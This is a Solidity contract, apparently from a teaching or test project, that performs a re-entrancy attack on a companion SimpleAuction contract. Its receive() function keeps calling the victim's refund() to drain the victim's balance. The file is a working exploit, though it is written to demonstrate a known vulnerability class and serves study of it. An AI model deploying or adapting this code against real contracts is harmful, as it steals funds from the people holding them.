// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./SimpleAuction.sol";
import "hardhat/console.sol";

/// Malicious contract example of a re-entrant
/// attack on the SimpleAuction contract
contract SimpleAuctionReEntrantAttacker {

    function bid(address payable address_) external payable {
        SimpleAuction victim = SimpleAuction(address_);
        
        console.log("Bidding ", msg.value, " to victim's contract", address_);
        victim.bid{value: msg.value}();
    }

    function refund(address payable address_) external payable {
        SimpleAuction victim = SimpleAuction(address_);
        
        console.log("Starting re-entrant attack on ", address_);
        victim.refund();
    }

    receive() external payable {
        // This example works only with SimpleAuction contract
        SimpleAuction victim = SimpleAuction(msg.sender);

        console.log("Performing re-entrant attack on ", msg.sender);

        if (msg.sender.balance >= 0.1 ether) {
            victim.refund();
        }
    }

}